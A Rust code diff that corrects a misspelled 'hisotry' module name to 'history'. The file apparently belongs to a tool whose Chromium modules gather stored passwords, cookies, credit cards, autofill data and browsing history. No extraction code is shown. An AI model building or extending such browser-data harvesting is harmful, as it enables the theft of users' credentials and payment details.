@@ -4,14 +4,14 @@ mod autofill;
 mod passwords;
 mod creditcards;
 mod downloads;
-mod hisotry;
+mod history;
 
 use crate::chromium::autofill::AutoFillTask;
 use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
 use crate::chromium::creditcards::CreditCardsTask;
 use crate::chromium::downloads::DownloadsTask;
-use crate::chromium::hisotry::HistoryTask;
+use crate::chromium::history::HistoryTask;
 use crate::chromium::passwords::PasswordsTask;
 use crate::vec;
 use alloc::borrow::ToOwned;
